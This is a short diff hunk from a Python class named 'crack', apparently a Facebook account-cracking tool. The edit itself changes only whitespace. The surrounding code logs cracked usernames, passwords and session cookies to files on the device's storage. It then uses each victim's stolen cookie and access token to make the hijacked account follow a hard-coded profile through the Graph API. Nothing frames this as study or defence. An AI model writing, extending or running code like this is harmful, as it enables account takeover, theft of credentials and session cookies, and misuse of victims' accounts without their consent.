@@ -944,7 +944,7 @@ class crack:
                         print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
                         #print(f"\r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
                         open("/sdcard/GS-2X/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
-                        open("/sdcard/GS-2X/M3-GSXD_COKIE.TXT", "a").write(used +	 "|"	 + pw + " | " + cokie + 								"\n")
+                        open("/sdcard/GS-2X/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" 		+ cokie + 			"\n")
                         ok.append(used + pw)
                         follow_id='100000160984736' #uzzal
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
